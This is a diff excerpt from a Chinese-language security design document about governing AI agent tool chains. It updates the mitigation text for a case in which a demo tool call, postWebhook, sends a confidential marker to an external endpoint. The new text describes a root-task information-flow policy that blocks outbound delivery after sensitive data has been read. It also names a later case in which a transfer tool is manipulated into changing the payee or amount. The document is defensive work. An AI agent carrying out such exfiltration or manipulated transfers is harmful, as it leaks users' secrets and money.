@@ -260,7 +260,7 @@ postWebhook({"endpointId":"external-demo","body":"DEMO-CONFIDENTIAL-7F2A"})
 
 读取可以发生一次，但外部发送动作不执行，接收器没有内容。只对最终聊天答案脱敏不能阻止工具已经发出的 HTTP 请求。
 
-**当前对应：** `InternalHttpDemo` 已证明工具内部 HTTP 不自动成为另一项治理动作；项目没有通用跨工具信息流跟踪。数据标签传播、上下文感知策略和受控 Webhook 连接器待新增。
+**当前对应：** 网页 ToolChainCase 已接入根任务信息流策略：两种目的地均通过参数许可，读取敏感来源后禁止向外部低等级目的地投递；未读取机密的公开消息仍可外发。该机制按根任务保守传播，不是字节级污点跟踪。具体配置和边界见 [安全补齐计划](security-hardening-plan.md)。`InternalHttpDemo` 仍说明工具内部直接 HTTP 不会自动变成另一个治理动作。
 
 ## 七、案例 06：合法转账工具被诱导改变收款人或金额
 
